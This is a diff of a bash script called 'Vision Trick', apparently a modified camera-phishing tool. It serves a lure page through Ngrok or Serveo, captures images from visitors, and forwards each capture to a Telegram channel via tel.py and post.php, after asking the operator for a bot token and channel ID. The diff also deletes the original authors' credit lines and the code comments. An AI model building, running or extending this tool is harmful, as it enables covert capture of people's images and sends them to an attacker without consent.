@@ -1,7 +1,5 @@
 #!/bin/bash
 # Vision Trick v1.1
-# Powered by TechChip (Modified for Vision Trick)
-# Credits to thelinuxchoice [github.com/thelinuxchoice/]
 
 trap 'printf "\n";stop' 2
 
@@ -219,11 +217,11 @@ checkfound() {
         if [[ -e "Log.log" ]]; then
             printf "\n\e[1;92m[\e[0m+\e[1;92m] Image captured and sent to Telegram!\e[0m\n"
             
-            # Get the latest image file in the images/ directory
+            
             latest_image=$(ls -t images/*.png 2>/dev/null | head -n 1)
             
             if [[ -n "$latest_image" ]]; then
-                # Call the Python script and pass the image file path
+               
                 echo "$latest_image" | python3 tel.py
                 if [[ $? -eq 0 ]]; then
                     printf "\e[1;92m[\e[0m+\e[1;92m] Image sent successfully!\e[0m\n"
@@ -240,25 +238,25 @@ checkfound() {
     done
 }
 
-# Main script execution
+
 banner
 check_dependencies
 
-# Prompt the user to input the Telegram bot token and channel ID
+
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your Telegram bot token: \e[0m' telegramBotToken
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your Telegram channel ID: \e[0m' telegramChannelId
 
-# Validate the inputs
+
 if [[ -z "$telegramBotToken" || -z "$telegramChannelId" ]]; then
     printf "\e[1;91m[!] Error: Bot token or channel ID is missing.\e[0m\n"
     exit 1
 fi
 
-# Update the post.php file with the provided bot token and channel ID
+
 sed -i "s|YOUR_BOT_TOKEN|$telegramBotToken|g" post.php
 sed -i "s|@mychannel|$telegramChannelId|g" post.php
 
-# Continue with the rest of the script
+
 printf "\n-----Choose tunnel server----\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
